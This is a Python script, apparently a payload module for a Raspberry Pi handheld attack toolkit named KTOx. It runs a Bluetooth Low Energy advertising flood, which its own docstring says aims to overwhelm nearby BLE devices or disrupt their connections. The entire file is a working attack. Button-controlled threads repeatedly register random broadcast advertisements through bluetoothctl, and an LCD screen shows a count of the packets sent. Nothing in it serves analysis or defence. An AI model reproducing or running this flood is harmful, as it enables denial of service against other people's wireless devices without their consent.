#!/usr/bin/env python3
"""
KTOx *payload* – **BLE Flood Attack**
========================================
This payload performs a Bluetooth Low Energy (BLE) advertising flood attack.
It continuously broadcasts random BLE advertisements using `bluetoothctl`,
aiming to overwhelm nearby BLE devices or disrupt their connections.

Features:
- Continuously broadcasts random BLE advertisements.
- Displays the number of packets sent on the LCD.
- Start/Stop functionality via OK button.
- Graceful exit via KEY3 or Ctrl-C, ensuring Bluetooth is cleaned up.

Controls:
- OK: Toggle attack (Start/Stop)
- KEY3: Exit Payload
"""

import sys
import os
import time
import signal
import subprocess
import threading
import random
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

PINS = { "OK": 13, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT_STATUS = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)
FONT = ImageFont.load_default()

HCI_INTERFACE = "hci0"
running = True
attack_thread = None
attack_stop_event = threading.Event()
packet_count = 0
current_advertisement_id = 0

def run_bt_command(command_parts, error_message, display_error=True):
    try:
        result = subprocess.run(command_parts, shell=False, check=True, capture_output=True, text=True)
        if result.stderr:
            print(f"WARNING: {error_message} - STDERR: {result.stderr.strip()}", file=sys.stderr)
        return True
    except subprocess.CalledProcessError as e:
        print(f"ERROR: {error_message} - Command: {' '.join(command_parts)} - STDERR: {e.stderr.strip()}", file=sys.stderr)
        if display_error:
            draw_ui(status="ERROR", message_lines=[f"ERROR: {error_message}", f"{e.stderr.strip()[:20]}"])
            time.sleep(3)
        return False
    except FileNotFoundError:
        print(f"ERROR: {error_message} - Command not found: {command_parts[0]}", file=sys.stderr)
        if display_error:
            draw_ui(status="ERROR", message_lines=[f"ERROR: Command not found", f"{command_parts[0]}"])
            time.sleep(3)
        return False

def cleanup(*_):
    global running
    if running:
        running = False
        attack_stop_event.set()
        print("Cleaning up Bluetooth devices...", file=sys.stderr)
        draw_ui(status="CLEANING UP", message_lines=["Cleaning up BLE..."])
        stop_attack() # Ensure attack is stopped gracefully
        run_bt_command(["bluetoothctl", "power", "off"], "Failed to power off Bluetooth", display_error=False)
        run_bt_command(["pkill", "-f", "bluetoothctl"], "Failed to kill bluetoothctl processes", display_error=False)
        print("Bluetooth cleanup complete.", file=sys.stderr)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_ui(status: str, message_lines=None):
    img = Image.new("RGB", (128, 128), (10, 0, 0))
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Generic BLE Flood", font=FONT_TITLE, fill=(231, 76, 60))
    d.line([(0, 22), (128, 22)], fill=(231, 76, 60), width=1)
    
    if message_lines:
        if isinstance(message_lines, str):
            message_lines = [message_lines]
        y_offset = (HEIGHT - len(message_lines) * 12) // 2
        for line in message_lines:
            bbox = d.textbbox((0, 0), line, font=FONT)
            w = bbox[2] - bbox[0]
            x = (WIDTH - w) // 2
            d.text((x, y_offset), line, font=FONT, fill=(212, 172, 13))
            y_offset += 12
    else:
        status_color = "lime" if status == "ACTIVE" else "red"
        d.text((30, 35), status, font=FONT_STATUS, fill=status_color)
        d.text((5, 60), "Packets Sent:", font=FONT, fill=(242, 243, 244))
        d.text((15, 75), str(packet_count), font=FONT_TITLE, fill=(212, 172, 13))
    
    d.text((5, 110), "OK=Start/Stop | KEY3=Exit", font=FONT, fill=(171, 178, 185))
    LCD.LCD_ShowImage(img, 0, 0)

def ble_flood_worker():
    global packet_count, current_advertisement_id
    
    while not attack_stop_event.is_set():
        manufacturer_data = "".join([f"{random.randint(0, 255):02x}" for _ in range(random.randint(2, 31))])
        
        if current_advertisement_id > 0:
            run_bt_command(["bluetoothctl", "remove-advertisement", str(current_advertisement_id)], "Failed to remove previous advertisement", display_error=False)

        current_advertisement_id += 1
        register_cmd_parts = [
            "bluetoothctl", "advertise", str(current_advertisement_id),
            "type", "broadcast",
            "manufacturer", "0x0000", manufacturer_data # Using a generic company ID
        ]
        
        if run_bt_command(register_cmd_parts, "Failed to register advertisement", display_error=False):
            if run_bt_command(["bluetoothctl", "advertise", "on"], "Failed to enable advertising", display_error=False):
                packet_count += 1
        
        time.sleep(0.1)

def start_attack():
    global attack_thread, packet_count, current_advertisement_id
    if not (attack_thread and attack_thread.is_alive()):
        packet_count = 0
        current_advertisement_id = 0
        attack_stop_event.clear()
        
        draw_ui(status="STARTING", message_lines=["Starting BLE Flood..."])
        # Explicitly ensure Bluetooth adapter is ready
        if not run_bt_command(["rfkill", "unblock", "bluetooth"], "Failed to unblock Bluetooth"): return False
        if not run_bt_command(["bluetoothctl", "power", "on"], "Failed to power on Bluetooth"): return False
        if not run_bt_command(["hciconfig", HCI_INTERFACE, "up"], "Failed to bring up HCI interface"): return False
        
        attack_thread = threading.Thread(target=ble_flood_worker, daemon=True)
        attack_thread.start()
        return True
    return False

def stop_attack():
    attack_stop_event.set()
    draw_ui(status="STOPPING", message_lines=["Stopping BLE Flood..."])
    run_bt_command(["bluetoothctl", "advertise", "off"], "Failed to stop advertising", display_error=False)
    run_bt_command(["bluetoothctl", "remove-advertisement", str(current_advertisement_id)], "Failed to remove current advertisement", display_error=False)
    run_bt_command(["bluetoothctl", "remove-advertisement", "0"], "Failed to remove default advertisement 0", display_error=False)
    
    if attack_thread:
        attack_thread.join(timeout=2)

class Payload:
    def run(self):
        try:
            is_attacking = False
            if not run_bt_command(["which", "bluetoothctl"], "bluetoothctl not found"):
                draw_ui(status="ERROR", message_lines=["bluetoothctl not found!"])
                time.sleep(3)
                raise SystemExit("bluetoothctl not found.")
            
            # Check for hciconfig as well
            if not run_bt_command(["which", "hciconfig"], "hciconfig not found"):
                draw_ui(status="ERROR", message_lines=["hciconfig not found!"])
                time.sleep(3)
                raise SystemExit("hciconfig not found.")

            while running:
                draw_ui("ACTIVE" if is_attacking else "STOPPED")
                
                start_wait = time.time()
                while time.time() - start_wait < 1.0:
                    if GPIO.input(PINS["KEY3"]) == 0:
                        cleanup()
                        break
                    if GPIO.input(PINS["OK"]) == 0:
                        is_attacking = not is_attacking
                        if is_attacking:
                            if not start_attack():
                                draw_ui(status="ERROR", message_lines=["Failed to start attack!"])
                                time.sleep(3)
                                is_attacking = False
                        else:
                            stop_attack()
                        time.sleep(0.3)
                        break
                    time.sleep(0.05)
                if not running: break
        except (KeyboardInterrupt, SystemExit):
            pass
        except Exception as e:
            print(f"[ERROR] {e}", file=sys.stderr)
            draw_ui(status="ERROR", message_lines=["An error occurred.", str(e)[:20]])
            time.sleep(3)
        finally:
            cleanup()
            LCD.LCD_Clear()
            GPIO.cleanup()
            print("BLE Flood payload finished.")

if __name__ == "__main__":
    payload = Payload()
    payload.run()